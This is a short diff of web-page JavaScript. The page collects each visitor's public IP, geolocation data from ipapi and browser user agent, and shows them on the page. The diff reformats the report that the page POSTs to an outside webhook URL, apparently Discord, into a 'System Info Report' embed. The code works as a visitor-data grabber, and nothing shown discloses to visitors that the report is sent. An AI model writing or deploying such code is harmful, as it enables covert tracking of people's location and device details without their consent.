@@ -66,7 +66,7 @@
                 info.publicIP = data.ip;
                 console.log("IP fetched:", data.ip);
 
-                // Use CORS proxy for geo data
+                // Use CORS proxy to avoid CORS issues
                 let geoResponse;
                 try {
                     geoResponse = await fetch(`https://cors-anywhere.herokuapp.com/https://ipapi.co/${data.ip}/json/`);
@@ -94,12 +94,27 @@
             output += "</ul>";
             document.getElementById("info").innerHTML = output;
 
+            // Creating embed structure
+            const embed = {
+                title: "System Info Report",
+                color: 7506394, // You can change this to your desired color (decimal format)
+                fields: Object.entries(info).map(([key, value]) => ({
+                    name: key,
+                    value: value,
+                    inline: false
+                })),
+                footer: {
+                    text: `Requested by: ${navigator.userAgent}`,
+                    icon_url: "https://upload.wikimedia.org/wikipedia/commons/a/a7/Discord_logo.svg" // Optional, set an icon for the footer
+                }
+            };
+
             try {
                 const response = await fetch(webhookUrl, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({
-                        content: `**New System Info Report:**\n${Object.entries(info).map(([key, value]) => `**${key}:** ${value}`).join("\n")}`
+                        embeds: [embed]
                     })
                 });
 
